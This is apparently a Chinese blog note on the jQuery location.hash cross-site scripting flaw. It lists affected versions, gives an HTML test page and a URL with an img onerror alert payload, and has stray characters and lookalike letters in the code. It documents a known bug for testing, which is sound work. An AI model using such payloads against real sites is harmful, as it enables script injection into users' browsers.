**原理：**

    [jQuery](https://so.csdn.net/so/search?q=jQuery&spm=1001.2101.3001.7020)中过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 location.hash 跨站漏洞

**影响版本：**

*       jquery-1.7.1~1.8.3
*       jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js
*       jquery-1.5所有版本
*       jquery-1.4所有版本
*       jquery-1.3所有版本
*       jquery-1.2所有版本

测试代码：

```
<html>      
<head>      
    <title>JQuery-xss-test</title>      
    <script  src="https://code.jquery.com/jquery-1.0.1.js" ></script>      
    <script>      
    $(function(){      
    try { $(location.hash) }       
    catch(e) {}      
    })      1
    </script>      1
</head>      1
<body>      1
    Jquery xss test.      1
</body>      1
</html>
```


然后访问如下：http://localhost/#<img src=/ οnerrοr=alert(1)>

在线测试平台：[JQuery跨站脚本在线测试](http://research.insecurelabs.org/jquery/test/)